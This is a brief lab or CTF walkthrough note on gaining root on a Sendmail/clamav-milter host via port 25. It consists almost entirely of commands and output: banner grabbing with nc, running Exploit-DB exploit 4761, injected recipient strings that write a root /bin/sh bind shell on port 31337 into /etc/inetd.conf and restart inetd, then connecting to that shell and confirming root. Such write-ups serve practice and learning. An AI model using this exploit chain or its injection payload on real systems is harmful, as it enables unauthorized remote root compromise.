# 4 :25 sendmail

```
$ nc 192.168.214.42 25
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 17 Aug 2021 21:36:53 -0400; (No UCE/UBE) logging access from: [192.168.49.214](TEMP)-[192.168.49.214]

# found this 
https://jhalon.github.io/pentestit-lab-11-clamav-token/
# some exploit using smtp

https://www.exploit-db.com/exploits/4761

$ perl 4761.pl 192.168.214.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.214.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 17 Aug 2021 21:54:22 -0400; (No UCE/UBE) logging access from: [192.168.49.214](TEMP)-[192.168.49.214]
250-localhost.localdomain Hello [192.168.49.214], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 17I1sMru004008 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection

# opens a new port 31337 and we can nc in

$ nc 192.168.214.42 31337

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
hostname
0xbabe.local
```
